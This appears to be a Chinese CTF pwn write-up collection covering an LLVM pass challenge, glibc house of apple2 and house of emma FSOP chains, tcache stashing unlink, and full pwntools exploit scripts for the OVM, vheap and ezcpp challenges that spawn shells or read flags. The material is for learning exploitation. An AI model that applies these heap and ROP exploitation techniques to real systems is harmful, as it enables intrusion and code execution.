刚做完红帽杯那个入门题来写这个，一看代码500多行的re直接不想看了，后来跟着这个博客过了一遍，收获不少 参考博客 核心思想 做llvm pass首先要知道主函数是什么，在此题中是这个,注意这里是小端序，因此函数名应当是B4ckDo0r llvm pass函数代码中的函数一定会有会判断其参数的部分，比如这里，参数个数就为2 确定函数参数的类型，是char *还是int还是别的，通过函数中具体内容来确定，比如有个复制函数那么它很可能是char * 函数的返回类型一般就是void，除非有其他特别的，然后主函数一般都是int，因为最后有return 0; 逆向函数中的具体内容，a.一般先找熟悉的函数，比如有memcpy这种，或者free这种，b.另一种方法就是注意一些全局变量的赋值，有时候就可以将一些地方的值存到某处，特别是此处在libc附近，c.最后就是要注意任意写，任意函数执行的地方 最后最重要的就是要学会动调，猜出程序的逻辑，难逆向的逻辑就动调猜出来 题目解析 函数逆向后大致逻辑如下 exp // clang-8 -emit-llvm -S exp.c -o exp.ll void save(char *a, char *b); void stealkey(); void fakekey(long long x); void run(); void B4ckDo0r() { save(&#34;
&#34;, &#34;
&#34;); save(&#34;&#34;, &#34;
&#34;); stealkey(); fakekey(-0x1ecbf0+0xe3afe); run(); }

  house of apple2 参考博客 libc2.35 3.6 0x16A06A libc2.35 3_ gadget=licbase+0x16A1FA magic_gadget = libc_base + libc.sym[&ldquo;svcudp_reply&rdquo;] + 0x1a
0x7ffff7f092ba &lt;svcudp_reply+26&gt; mov rbp, qword ptr [rdi + 0x48] 0x7ffff7f092be &lt;svcudp_reply+30&gt; mov rax, qword ptr [rbp + 0x18] 0x7ffff7f092c2 &lt;svcudp_reply+34&gt; lea r13, [rbp + 0x10] 0x7ffff7f092c6 &lt;svcudp_reply+38&gt; mov dword ptr [rbp + 0x10], 0 0x7ffff7f092cd &lt;svcudp_reply+45&gt; mov rdi, r13 0x7ffff7f092d0 &lt;svcudp_reply+48&gt; call qword ptr [rax + 0x28] 具体做法 fake_IO_addr = magic_gadget = libc_base + libc.sym[&#34;svcudp_reply&#34;] + 0x1a leave_ret = libc_base + 0x0000000000052d72 #: leave ; ret pop_rdi_ret = libc_base + 0x000000000002daa2 #: pop rdi ; ret pop_rsi_ret = libc_base + 0x0000000000037c0a #: pop rsi ; ret pop_rdx_r12_ret = libc_base + 0x00000000001066e1 #: pop rdx ; pop r12 ; ret rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70 #read(0, (void *)ptr[num], 0xAA0uLL)直接向_IO_2_1_stderr_写入数据，同时伪造A,B,C三个fake file orw_rop = b&#39;./flag\x00\x00&#39; orw_rop += p64(pop_rdx_r12_ret) + p64(0) + p64(fake_IO_addr - 0x10) orw_rop += p64(pop_rdi_ret) + p64(rop_address) orw_rop += p64(pop_rsi_ret) + p64(0) orw_rop += p64(libc_base + libc.sym[&#39;open&#39;]) orw_rop += p64(pop_rdi_ret) + p64(3) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc_base + libc.sym[&#39;read&#39;]) orw_rop += p64(pop_rdi_ret) + p64(1) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc_base + libc.sym[&#39;write&#39;]) payload = p64(0) + p64(leave_ret) + p64(1) + p64(2) #这样设置同时满足assert和fsop payload = payload.ljust(0x38, b&#39;\x00&#39;) + p64(rop_address) #FAKE FILE+0x48 payload = payload.ljust(0x90, b&#39;\x00&#39;) + p64(fake_IO_addr + 0xe0) #_wide_data=fake_IO_addr + 0xe0 payload = payload.ljust(0xc8, b&#39;\x00&#39;) + p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]) #vtable=_IO_wfile_jumps #*(A+0Xe0)=B _wide_data-&gt;_wide_vtable=fake_IO_addr + 0xe0 + 0xe8 payload = payload.ljust(0xd0 + 0xe0, b&#39;\x00&#39;) + p64(fake_IO_addr + 0xe0 + 0xe8) #*(B+0X68)=C=magic_gadget payload = payload.ljust(0xd0 + 0xe8 + 0x68, b&#39;\x00&#39;) + p64(magic_gadget) payload = payload + orw_rop 过程描述 rdi= A,rbp=rop_addr rax=A-0x10 call [rax+0x28]等价于call leave;ret leave：mov rsp,rbp; pop rbp 此时rsp=rop_addr再ret执行rop house of emma libc2.34,在libc2.35就没了这个gadget gadget_addr = libc_base + 0x146020 各个libc相差一般也不会太远，就在附近找就行 可以设置rdx的值然后setcontent+61来进行orw
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];

  [TOC] 学习时参考的博客 一篇讲原理的博客 例题博客 例题博客 例题博客 1.获得任意地址target_addr的控制权 2.在任意地址target_addr写入大数值 但是说实话这个技巧除了配合house of pig好像没有太大作用
代码 calloc(0xa0) #让tcache中有6个0xb0的chunk for i in range(6): calloc(0xa0) free(i) #---------------------一般都是通过切割unsorted bin来得到smallbin的堆块------------------- calloc(0x4b0) #9 calloc(0xb0) #10 free(9) #此时smallbin有1个0xb0的chunk calloc(0x400) calloc(0x4b0) #11 calloc(0xb0) #12 free(11) #此时smallbin有2个0xb0的chunk calloc(0x400) #13 edit(11,b&amp;#39;\x00&amp;#39;*0x400+p64(prev_size)+p64(size)+p64(heapbase+0xb00)+p64(target_addr-0x10)) #tcache 0xb0 :6个 #smallbin 0xb0 :bin-&amp;gt;chunkA-&amp;gt;chunkB chunkA的bk为target_addr-0x10 #触发tcache stashing unlink attack calloc(0xa0) 核心 define last(b) ((b)-&amp;gt;bk) if ((tc_victim = last (bin)) != bin) bck = tc_victim-&amp;gt;bk; bin-&amp;gt;bk = bck; bck-&amp;gt;fd = bin; 任意地址上写一个较大的数（和unsortedbin attack 类似） tcache_put (tc_victim, tc_idx);
如果我们可以控制smallbin的bk，那么bck就可以为任意地址，而后它又被放到tcache中，我们可以将它再malloc出来利用 bin在main_arena附近，那么bck-&amp;gt;fd=bin实现了任意地址上写一个较大的数 限制: 需要UAF 主要适 …

  OGEEK2019_FINAL_OVM 数组溢出
from pwn import * context.log_level=&#39;debug&#39; p = process(&#34;vmpwn&#34;) elf = ELF(&#34;vmpwn&#34;) libc = elf.libc s = lambda data :p.send(data) sa = lambda text,data :p.sendafter(text, str(data)) sl = lambda data :p.sendline(data) sla = lambda text,data :p.sendlineafter(text, str(data)) r = lambda num=4096 :p.recv(num) ru = lambda text :p.recvuntil(text) uu32 = lambda :u32(p.recvuntil(&#34;\xf7&#34;)[-4:].ljust(4,&#34;\x00&#34;)) uu64 = lambda :u64(p.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,&#34;\x00&#34;)) lg = lambda name,data :p.success(name + &#34;-&gt; 0x%x&#34; % data) def opcode(code, dst, op1, op2): res = code&lt;&lt;24 res += dst&lt;&lt;16 res += op1&lt;&lt;8 res += op2 return str(res) p.recvuntil(&#34;PC: &#34;) p.sendline(&#39;0&#39;) p.recvuntil(&#34;SP: &#34;) p.sendline(&#39;1&#39;) p.recvuntil(&#34;CODE SIZE: &#34;) p.sendline(&#39;24&#39;) p.recvuntil(&#34;CODE: &#34;) # 将stderr_got表里存的_IO_2_1_stderr的地址转递给reg[3]reg[2] sl(opcode(0x10, 0, 0, 26)) #reg[0] = 26 sl(opcode(0x80, 1, 1, 0)) #reg[1] = -26 sl(opcode(0x30, 2, 0, 1)) #reg[2] = memory[reg[1]] sl(opcode(0x10, 0, 0, 25)) #reg[0] = 25 sl(opcode(0x10, 1, 0, 0)) #reg[1] = 0 sl(opcode(0x80, 1, 1, 0)) #reg[1] = -25 sl(opcode(0x30, 3, 0, 1)) #reg[3] = memory[reg[1]] # reg[4]构造一个0x10a0，给reg[2]加上，即_IO_2_1_stderr+0x10a0=free_hook-8 sl(opcode(0x10, 4, 0, 1)) #reg[4] = 1 sl(opcode(0x10, 5, 0, 12)) #reg[5] = 12 sl(opcode(0xc0, 4, 4, 5)) #reg[4] = 1&lt;&lt;12 = 1000 sl(opcode(0x10, 5, 0, 0xa)) #reg[5] = 0xa sl(opcode(0x10, 6, 0, 4)) #reg[6] = 4 sl(opcode(0xc0, 5, 5, 6)) #reg[5] = 0xa0 sl(opcode(0x70, 4, 4, 5)) #reg[4] = reg[4]+reg[5] = 0x10a0 sl(opcode(0x70, 2, 4, 2)) #reg[2] = reg[4]+reg[2] # 将comment改为free_hook-8 sl(opcode(0x10, 4, 0, 8)) #reg[4] = 8 sl(opcode(0x10, 1, 0, 0)) #reg[1] = 0 sl(opcode(0x80, 1, 1, 4)) #reg[1] = 0-8 = -8 sl(opcode(0x40, 2, 0, 1)) #memory[reg[1] = reg[2]] sl(opcode(0x10, 5, 0, 7)) #reg[5] = 7 sl(opcode(0x10, 1, 0, 0)) #reg[1] = 0 sl(opcode(0x80, 1, 1, 5)) #reg[1] = reg[1] - reg[4] = -7 sl(opcode(0x40, 3, 0, 1)) #memory[reg[1]] = reg[3] sl(opcode(0xe0, 0, 0, 0)) #exit ru(&#39;R2: &#39;) low = int(r(8), 16) + 8 ru(&#39;R3: &#39;) high = int(r(4), 16) print hex(low), hex(high) libc_base = (high&lt;&lt;32) + low - libc.sym[&#39;__free_hook&#39;] lg(&#39;libc_base&#39;, libc_base) system = libc_base + libc.sym[&#39;system&#39;] # 读入comment，修改到free_hook sl(&#39;/bin/sh\x00&#39;+p64(system)) p.interactive() vheap 堆溢出修改fd
from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) p=process(&#39;/home/zp9080/PWN/vheap&#39;) elf=ELF(&#39;/home/zp9080/PWN/vheap&#39;) libc=ELF(&#39;/home/zp9080/PWN/libc-2.27.so&#39;) def dbg(): gdb.attach(p,&#39;b *$rebase(0xEC6 )&#39;) pause() s = lambda data :p.send(data) sa = lambda text,data :p.sendafter(text, data) sl = lambda data :p.sendline(data) sla = lambda text,data :p.sendlineafter(text, data) r = lambda num=4096 :p.recv(num) ru = lambda text :p.recvuntil(text) uu64 = lambda :u64(p.recvuntil(&#34;\x7f&#34;)[-6:].ljust(8,&#34;\x00&#34;)) lg = lambda name,data :p.success(name + &#34;-&gt; 0x%x&#34; % data) pay = &#39;%20$p&#39; sla(&#34;first,tell me your name.&#34;,pay) p.recvuntil(&#34;welcome:&#34;) libc_base = int(p.recv(14),16)-231-libc.sym[&#39;__libc_start_main&#39;] lg(&#39;libc_base&#39;,libc_base) free_hook = libc_base+libc.sym[&#39;__free_hook&#39;] one = libc_base+0x4f302 sla(&#34;How many pieces of data?\n&#34;,&#39;2&#39;) s(b&#39;a&#39;*0x18+p64(0x70)+p64(free_hook)) s(p64(one)) p.recvuntil(&#34;Size:\n&#34;) s(&#39;9&#39;) def pack(code, dst, op2, op1): res = code&lt;&lt;24 res += dst&lt;&lt;16 res += op2&lt;&lt;8 res += op1 return str(res) p.recvuntil(&#34;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&#34;) p.sendline(pack(0xa,0,0x10,0)) p.sendline(pack(0xa,0,0x60,1)) p.sendline(pack(0xa,0,0x60,2)) p.sendline(pack(0xc,0,0,1)) #直接打tcache poison p.sendline(pack(0xb,0,0,0))# memcpy p.sendline(pack(0xa,0,0x60,0)) p.sendline(pack(0xa,0,0x60,1)) p.sendline(pack(0xb,1,0,1)) p.sendline(pack(0xc,0,0,2)) p.interactive() &#39;&#39;&#39; 0x4f2a5 execve(&#34;/bin/sh&#34;, rsp+0x40, environ) constraints: rsp &amp; 0xf == 0 rcx == NULL 0x4f302 execve(&#34;/bin/sh&#34;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a2fc execve(&#34;/bin/sh&#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL &#39;&#39;&#39;

例题 SICTF ROUND3 ezcpp 题目分析 题目上来泄露出了pie，也有后门函数，然后是两个功能get和print，核心思路是劫持vtable 细节阐述 对ida反汇编的函数不理解的需要动态调试看看到底是什么个功能 stdcin遇到
才会停止读取 c++中strings也会在堆上开辟空间 vtable 堆中会开辟空间存结构体，第二张图中rdi的值heap-&gt;elf+0x4d48-&gt;函数的实际地址 逆向出来的结构 name长度为0x10字节，password长度为0x10字节，第二个chunk的mem位置，第一个存的是vtable，第二个存的是是name_addr 利用思路 修改图中0x340中的elf+0x4d48为name_addr，在name_addr处写入后门函数，实现对vtable的劫持 显然要泄露堆地址，这里有个很巧的地方就是原本存name_addr处的地方是0x348,print函数是用*name来进行打印的。如果把原本的name_addr修改为0x348，那么*0x348刚好就是其本身的值，打印出来就泄露了堆地址 from pwn import * from pwnlib.util.packing import p64 from pwnlib.util.packing import u64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) def get(name, passwd): p.recvuntil(b&#39;&gt;&gt; &#39;) p.sendline(b&#39;G&#39;) p.recvuntil(b&#39;name: &#39;) p.sendline(name) p.recvuntil(b&#39;password: &#39;) p.sendline(passwd) def show(): p.recvuntil(b&#39;&gt;&gt; &#39;) p.sendline(b&#39;P&#39;) # p = process(&#34;/home/zp9080/PWN/cpp&#34;) p=gdb.debug(&#34;/home/zp9080/PWN/cpp&#34;,&#39;b *$rebase(0x274C)&#39;) # set offset to 0x40 to check if the offset is correct by comparing with vtable offset = 0x48 p.recvuntil(b&#39;gift: &#39;) main = int(p.recvuntil(b&#39;
&#39;)[:-1], 16) pie = main - 0x2650 success(&#39;pie addr -&gt; {}&#39;.format(hex(pie))) backdoor = pie + 0x22e0 vtable = pie + 0x4d48 info(&#39;vtable -&gt; {}&#39;.format(hex(vtable))) get(b&#39;123&#39;,flat([b&#39;a&#39; * 0x10,0, 0x21,vtable, bytes([offset])])) show() p.recvuntil(b&#39;Name: &#39;) ptr = u64(p.recvuntil(b&#39;
&#39;)[:-1].ljust(8, b&#39;\x00&#39;)) # heap name_addr = ptr - 0x38 get(flat([name_addr]),flat([0x21])) # if name is 123, rollback success fake_vtable = name_addr get(flat([backdoor, backdoor]), flat([b&#39;a&#39; * 0x10,0, 0x21,fake_vtable, name_addr])) # get or show will trigger the backdoor show() p.interactive()
